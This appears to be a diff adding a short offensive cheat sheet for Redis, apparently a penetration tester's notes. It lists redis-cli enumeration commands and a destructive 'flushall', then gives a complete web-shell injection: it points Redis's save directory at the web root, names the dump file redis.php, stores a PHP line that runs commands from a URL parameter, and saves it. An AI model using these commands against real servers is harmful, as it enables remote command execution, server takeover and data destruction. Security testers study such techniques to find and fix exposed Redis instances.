@@ -1,0 +1,21 @@
+### REDIS ###
+
+redis-cli -h $h
+redis-cli -h $h -p 6379 -a PASS
+> info								# get infos
+> flushall							# flush everything
+> info keyspace							# list db
+> select 0							# select db 0
+> keys * 							# list all keys
+> type KEY							# get the type of the value
+> GET KEY							# get value of a key (string)
+> HGETALL KEY							# get value (hash)
+> LRANGE KEY 0 1000						# get value (list)
+
+
+# inject
+> config set dir /var/www/html
+> config set dbfilename redis.php
+> set test "<?php system($_GET['cmd']); ?>"
+> save
+
